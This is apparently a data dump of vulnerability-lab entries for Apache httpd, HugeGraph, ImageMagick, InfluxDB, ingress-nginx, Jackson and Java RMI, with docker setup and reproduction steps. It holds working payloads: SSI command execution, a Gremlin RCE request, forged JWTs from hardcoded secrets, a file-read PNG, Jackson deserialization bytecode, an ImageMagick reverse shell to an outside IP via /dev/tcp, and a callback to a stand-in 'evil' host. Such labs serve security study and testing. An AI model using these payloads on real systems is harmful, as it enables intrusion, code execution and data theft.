AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close




Got the response of http://example.com:
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html"
httpd,Unknown,Apache HTTP Server SSI Remote Command Execution,"Apache HTTP Server SSI Remote Command Execution

中文版本(Chinese version)

Apache HTTP Server with Server Side Includes (SSI) enabled allows server-side execution of commands through special SSI directives in HTML files. When misconfigured, this feature can be exploited through file upload vulnerabilities.

When testing arbitrary file upload vulnerabilities, the target server might block files with PHP extensions. However, if the server has SSI and CGI support enabled, attackers can upload an SHTML file and execute arbitrary commands using the <!--#exec cmd=""command"" --syntax.

References:
Apache SSI Documentation
W3 SSI Directives

Environment Setup

Execute the following command to start an Apache HTTP Server with SSI and CGI support:


docker compose up -d


After the server is started, visit http://your-ip:8080/upload.php to access the upload form.

Vulnerability Reproduction

While uploading PHP files is not allowed, we can upload a file named shell.shtml with the following content:

shtml
<!--#exec cmd=""ls"" --




After successful upload, visiting the shell.shtml file will execute the command, demonstrating the vulnerability:
-------------------------------------------------------------------------------",
httpd,CVE-2017-15715,Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715),"Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715)

中文版本(Chinese version)

Apache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. A parsing vulnerability exists in versions 2.4.0 through 2.4.29, where a filename ending with 1.php\x0A will be treated as a PHP file, allowing attackers to bypass certain server security policies.

References:
<https://httpd.apache.org/security/vulnerabilities_24.html
<https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html

Environment Setup

Execute the following commands to build and start a vulnerable Apache HTTPD server:


docker compose build
docker compose up -d


After the server is started, Apache will be running at http://your-ip:8080.

Vulnerability Reproduction

First, try to upload a file named 1.php. The upload will be blocked by the security check:



However, if we append a \x0A (note: must be \x0A alone, not \x0D\x0A) to the filename 1.php, the upload will succeed:



When accessing the uploaded file at /1.php%0a, it will be successfully parsed as a PHP file, despite not having a proper PHP extension. This confirms the existence of the parsing vulnerability:
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html"
httpd,Unknown,Apache HTTPD Multiple Extension Parsing Vulnerability,"Apache HTTPD Multiple Extension Parsing Vulnerability

中文版本(Chinese version)

Apache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. This vulnerability is related to how Apache HTTPD handles files with multiple extensions.

Apache HTTPD supports files having multiple extensions, with different directives being executed for each extension. When misconfigured, this feature can lead to security vulnerabilities where malicious files bypass upload restrictions. For example, with the following configuration:


AddType text/html .html
AddLanguage zh-CN .cn
AddHandler application/x-httpd-php .php


The server will process multiple extensions from left to right, and if any extension is configured to be handled by a specific handler (like PHP), it will be executed regardless of its position in the filename. This means a file named malicious.php.jpg would still be executed as PHP code, potentially bypassing upload restrictions that only check the final extension.

References:
Apache HTTP Server Documentation - MultiViews
OWASP File Upload Vulnerabilities

Environment Setup

Execute the following command to start an Apache server with PHP 7.3 environment:


docker compose up -d


Vulnerability Reproduction

First, visit http://your-ip/uploadfiles/apache.php.jpeg in your browser. You'll notice that despite having a .jpeg extension, the file is executed as PHP code and displays the phpinfo() page.

To actively exploit this vulnerability, visit http://your-ip/index.php where you'll find a file upload interface with extension whitelist validation. The upload functionality only checks the final extension but doesn't rename the uploaded file. By uploading a file with multiple extensions like shell.php.jpg or shell.php.jpeg, we can bypass the extension check while ensuring the file is still executed as PHP code by Apache.



After successful upload, accessing the file through the browser will execute the PHP code, demonstrating the vulnerability:
-------------------------------------------------------------------------------",
hugegraph,CVE-2024-27348,Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348),"Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348)

中文版本(Chinese version)

Apache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.

A remote code execution vulnerability exists in the Gremlin API of HugeGraph. Gremlin is a graph traversal language that can be implemented in various programming languages such as Groovy, Python, and Java. An attacker is able to use Gremlin API to execute Groovy based Gremlin commands without authentication, which can be used to execute arbitrary commands.

In theory, Apache HugeGraph will use the SecurityManager to restrict the Groovy scripts submitted by users. But the SecurityManager only checks thread names that start with ""gremlin-server-exec"" or ""task-worker"". This mechanism can be bypassed by using reflection to modify the current thread name, allowing arbitrary code execution.

References:
<https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
<https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
<https://github.com/Zeyad-Azima/CVE-2024-27348

Environment Setup

Execute the following command to start a vulnerable HugeGraph server 1.2.0:


docker compose up -d


After the server is started, you can access the HugeGraph RESTful API at http://your-ip:8080.

Vulnerability Reproduce

Send a malicious Gremlin query through the Gremlin API endpoint to execute arbitrary commands:


POST /gremlin HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 777

{
    ""gremlin"": ""Thread thread = Thread.currentThread();Class clz = Class.forName(\""java.lang.Thread\"");java.lang.reflect.Field field = clz.getDeclaredField(\""name\"");field.setAccessible(true);field.set(thread, \""SL7\"");Class processBuilderClass = Class.forName(\""java.lang.ProcessBuilder\"");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\""id\"");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\""start\"");org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());"",
    ""bindings"": {},
    ""language"": ""gremlin-groovy"",
    ""aliases"": {}
}


The command will be executed successfully:
-------------------------------------------------------------------------------","https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
https://github.com/Zeyad-Azima/CVE-2024-27348"
hugegraph,CVE-2024-43441,Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441),"Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441)

中文版本(Chinese version)

Apache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.

A JWT token secret hardcoding vulnerability exists in Apache HugeGraph. When authentication is enabled but auth.token_secret is not configured, HugeGraph will use a hardcoded default JWT secret key with the value FXQXbJtbCLxODc6tGci732pkH1cyf8Qg. An attacker can use this default secret key to generate valid JWT tokens and bypass authentication to perform unauthorized operations.

References:
<https://github.com/advisories/GHSA-f697-gm3h-xrf9
<https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246

Environment Setup

Execute the following command to start a Apache HugeGraph 1.3.0 server:


docker compose up -d


After the server is started, you can access the HugeGraph RESTful API at http://your-ip:8080.

By default, Apache HugeGraph supports two authentication modes: HTTP Basic Authentication and JWT Authentication. When starting the docker container, it will use the PASSWORD environment variable as the default administrator's password. Then you can access the API using HTTP Basic Authentication with the username ""admin"" and this password.

If you try to access the API without providing any authentication headers, you will receive the following error:

json
{
    ""exception"": ""class jakarta.ws.rs.NotAuthorizedException"",
    ""message"": ""Authentication credentials are required"",
    ""cause"": """"
}


Vulnerability Reproduce

Besides the default administrator's password, we can also use the default JWT secret key to generate a valid JWT token and bypass the authentication.

Generate a JWT token using the default secret key:

python
Install the jwt library by running pip install pyjwt
import jwt

Generate JWT token using the default secret
token = jwt.encode(
    {
      ""user_name"": ""admin"",
      ""user_id"": ""-30:admin"",
      ""exp"": 9739523483
    },
    ""FXQXbJtbCLxODc6tGci732pkH1cyf8Qg"",
    algorithm=""HS256""
)
print(f""Generated JWT token: {token}"")
Output:
Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg


Use the generated token to access protected endpoints:


GET /graphs HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg


You will receive the following response:



If you remove the Authorization header, you will receive the following error:
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-f697-gm3h-xrf9
https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246"
imagemagick,CVE-2022-44268,ImageMagick Arbitrary File Disclosure (CVE-2022-44268),"ImageMagick Arbitrary File Disclosure (CVE-2022-44268)

中文版本(Chinese version)

ImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.

In the version prior to 7.1.0-51 on ImageMagick, there is a information disclosure vulnerability that is able to be used to read arbitrary file when modifing a PNG file.

References:
<https://www.metabaseq.com/imagemagick-zero-days/
<https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06

Vulnerable Environment

Execute folloiwing command to start a Web server that uses the ImageMagick to convert an old image to a 50x50 size new image:


docker compose up -d


After the server is started, visit http://your-ip:8080 you will see an upload file button:



The backend service is as simple as the following lines of code:

php
$newname = uniqid() . '.png';
shellexec(""convert -resize 50x50 {$FILES['fileupload']['tmpname']} ./{$newname}"");


Exploit

To exploit this issue, you have to prepare a craft PNG file that contains a chunk data with the file path that you want to disclose.

Use poc.py to generate it:


./poc.py generate -o poc.png -r /etc/passwd


Install PyPNG to execute poc.py properly: pip install pypng

There is a type of tEXt chunk that contains our payload profile=/etc/passwd if you use 010editor to review this file:



Then, upload this file to target server:



Download the output artifact as out.png, use poc.py to extract all the chunks from it:


./poc.py parse -i out.png




As you can see, /etc/passwd is read and the result have been written to output file by ImageMagick.
-------------------------------------------------------------------------------","https://www.metabaseq.com/imagemagick-zero-days/
https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06"
imagemagick,CVE-2020-29599,ImageMagick Shell Injection via PDF Password (CVE-2020-29599),"ImageMagick Shell Injection via PDF Password (CVE-2020-29599)

中文版本(Chinese version)

ImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.

References:
https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

Environment Setup and Exploit

Execute the following command to enter the Linux shell where Imagemagick 7.0.10-36 is installed:


docker compose run im bash


Enter the /tmp directory and convert the format of poc.svg to trigger the vulnerability:


root@f200ec9e1c1e:/# cd /tmp/
root@f200ec9e1c1e:/tmp# ls
poc.svg
root@f200ec9e1c1e:/tmp# identify poc.svg
poc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.003
root@f200ec9e1c1e:/tmp# convert poc.svg poc.png
sh: 1: : Permission denied
convert: MagickCore/image.c:1168: DestroyImage: Assertion `image != (Image *) NULL' failed.
Aborted
root@f200ec9e1c1e:/tmp# ls
0wned  poc.svg
root@f200ec9e1c1e:/tmp#


The command echo $(id)./0wned has been executed successfully:
-------------------------------------------------------------------------------",https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
imagemagick,Unknown,"Page Moved

The ""imagetragick"" issue is moved to CVE-2016-3714
-------------------------------------------------------------------------------","Page Moved

The ""imagetragick"" issue is moved to CVE-2016-3714
-------------------------------------------------------------------------------",
imagemagick,CVE-2016-3714,ImageMagick Imagetragick Command Injection (CVE-2016–3714),"ImageMagick Imagetragick Command Injection (CVE-2016–3714)

中文版本(Chinese version)

ImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.

In ImageMagick version before 6.9.3-9, insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats. The CVE-2016-3714 is also called ""imagetragick"".

References:
<https://imagetragick.com
<https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
<https://github.com/ImageTragick/PoCs

Environment Setup

Execute the following command to start a PHP server that includes ImageMagick 6.9.2-10:


docker compose up -d


Exploit

Visit http://your-ip:8080/ to see an upload component.

Send the following request:


POST / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Length: 328
-----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Disposition: form-data; name=""file_upload""; filename=""1.gif""
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg""|curl ""www.leavesongs.com:8889)'
pop graphic-context
-----WebKitFormBoundarymdcbmdQR1sDse9Et--


It can be seen that www.leavesongs.com:8889 has received the http request, after the curl command was executed successfully:



POC of getting a reverse shell：


push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash""||id "" )'
pop graphic-context
-------------------------------------------------------------------------------","https://imagetragick.com
https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
https://github.com/ImageTragick/PoCs"
influxdb,CVE-2019-20933,InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933),"InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933)

中文版本(Chinese version)

InfluxDB is an open-source time series database developed by the company InfluxData.

InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

References:
https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
https://github.com/influxdata/influxdb/issues/12927
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings

Vulnerable Environment

Execute following command to start a InfluxDB 1.6.6:


docker compose up -d


After server is started, you can see some debug information in http://your-ip:8086/debug/vars. But you are unable to execute SQL statement without authencation and a 401 error is responsed:



Vulnerability Reproduce

We can use <https://jwt.io/to generate a valid JWT token with an empty secret key:


{
  ""alg"": ""HS256"",
  ""typ"": ""JWT""
}
{
  ""username"": ""admin"",
  ""exp"": 2986346267
}


Where username is the administrator account name, and exp is the token expiration time. You should set exp to a future time to make it effect:



Then take this token to the request, and success to execute SQL statement show users in the server:


POST /query HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpAC6pnK3JJFkUKGq9eEi8T2wdum3Rs
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

db=sample&q=show+users
-------------------------------------------------------------------------------","https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
https://github.com/influxdata/influxdb/issues/12927
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings
https://jwt.io/"
ingress-nginx,CVE-2025-1974,Kubernetes Ingress-NGINX Unauthenticated Remote Code Execution (CVE-2025-1974),"Kubernetes Ingress-NGINX Unauthenticated Remote Code Execution (CVE-2025-1974)

中文版本(Chinese version)

Ingress-NGINX is an ingress controller for Kubernetes that uses NGINX as a reverse proxy and load balancer.

The ""IngressNightmare"" vulnerability (CVE-2025-1974) stems from a critical flaw in the Ingress-NGINX Admission Controller, a core Kubernetes security mechanism responsible for validating incoming Ingress resources. This controller is exposed over the network without requiring authentication, allowing attackers to craft malicious AdmissionReview requests and inject unauthorized configurations into Ingress resources. When chained with other vulnerabilities (CVE-2025-24514, CVE-2025-1097, or CVE-2025-1098), this can lead to remote code execution.

Some exploitable chains are known:
CVE-2025-1974 + CVE-2025-24514: RCE via auth-url annotation injection
CVE-2025-1974 + CVE-2025-1097: RCE via auth-tls-match-cn annotation
CVE-2025-1974 + CVE-2025-1098: RCE via image UID abuse

References:
<https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
<https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
<https://github.com/yoshino-s/CVE-2025-1974
<https://github.com/Clifford-prog/IngressNightmare-PoC
<https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425

Environment Setup

To simulate the vulnerability, a K3s-based Kubernetes environment is used for simplicity:


docker compose up -d


The script will wait for the Kubernetes API to be ready and for the ingress-nginx controller to start. Once the environment starts, Ingress-NGINX listens on ports 30080 and 30443 (TLS), and the Ingress-NGINX Admission Controller also reverse proxies to port 30443，for example https://localhost:30443/networking/v1/ingresses.

Vulnerability Reproduction

First, a shared object (.so) payload matching the container's architecture needs to be compiled.

c
include<stdio.h
include<stdlib.h

attribute((constructor)) static void reverse_shell(void)
{
    system(""touch /tmp/hacked"");
}


Use the following command to compile the source code:


gcc -shared -fPIC -o shell.so shell.c


After compiling the source code above with the appropriate environment, use exploit.py to exploit the vulnerability:


python exploit.py -a https://localhost:30443/networking/v1/ingresses -i http://localhost:30080/fake/addr -s shell.so


The exploit works by forging an AdmissionReview request to inject an ssl_engine directive, which forces NGINX to load the malicious dynamic shared object. Upon successful exploitation, you should observe the creation of a /tmp/hacked file inside the ingress-nginx container.
-------------------------------------------------------------------------------","https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
https://github.com/yoshino-s/CVE-2025-1974
https://github.com/Clifford-prog/IngressNightmare-PoC
https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425
https://localhost:30443/networking/v1/ingresses
http://localhost:30080/fake/addr"
jackson,CVE-2017-7525,Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525),"Jackson-databind Deserialization Remote Command Execution (CVE-2017-7525)

中文版本(Chinese version)

Jackson Databind is a popular Java library used for serializing Java objects to JSON (JavaScript Object Notation) and deserializing JSON back into Java objects.

Jackson-databind supports Polymorphic Deserialization feature (which is disabled by default). Attackers are able to use this feature to perform remote code exection.

References:
JacksonPolymorphicDeserialization
Exploiting the Jackson RCE: CVE-2017-7525
jackson-rce-via-spel
Jackson Deserializer security vulnerability

Vulnerable environment

Execute following command to start a web server that uses Jackson 2.8.8:

shell
docker compose up -d


After the server is started, http://your-ip:8080/ is your web page.

Exploit

CVE-2017-7525

Send following request to use the TemplatesImpl to execute Java bytescode, which contains command touch /tmp/prove1.txt:


POST /exploit HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 1298

{
  ""param"": [
    ""com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"",
    {
      ""transletBytecodes"": [
  ""yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==""
      ],
      ""transletName"": ""a.b"",
      ""outputProperties"": {}
    }
  ]
}




This exploit can only be used in environments with Java versions lower than 7u21.

CVE-2017-17485

Jackson released a patch to fix CVE-2017-7525, but CVE-2017-17485 used org.springframework.context.support.FileSystemXmlApplicationContext to bypass it.

To reproduce CVE-2017-17485, prepare a evil XML content on your server, such as http://evil/spel.xml:

xml
<beans xmlns=""http://www.springframework.org/schema/beans""
       xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
       xsi:schemaLocation=""
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
""
    <bean id=""pb"" class=""java.lang.ProcessBuilder""
        <constructor-arg
            <array
                <valuetouch</value
                <value/tmp/prove2.txt</value
            </array
        </constructor-arg
        <property name=""any"" value=""#{ pb.start() }""/
    </bean
</beans


Then, send following request to load the evil XML and execute command touch /tmp/prove2.txt:


POST /exploit HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 138

{
  ""param"": [
    ""org.springframework.context.support.FileSystemXmlApplicationContext"",
    ""http://evil/spel.xml""
  ]
}
-------------------------------------------------------------------------------","http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd"
java,Unknown,Java RMI Codebase Remote Code Execution,"Java RMI Codebase Remote Code Execution

中文版本(Chinese version)

Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Under certain conditions, an RMI client can specify java.rmi.server.codebase to make the server load remote objects, leading to the execution of arbitrary Java bytecode on the server.

References:
<https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html
<https://paper.seebug.org/1091/

Environment Setup

Execute the following commands to compile and start the RMI Registry and server:


docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 -p 64000:64000 rmi


Replace your-ip with your server's IP address. The client will use this IP to connect to the server.

After startup, the RMI Registry will be listening on port 1099.

Vulnerability Reproduction

To be completed.
-------------------------------------------------------------------------------","https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html
https://paper.seebug.org/1091/"
java,Unknown,Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution,"Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution

中文版本(Chinese version)

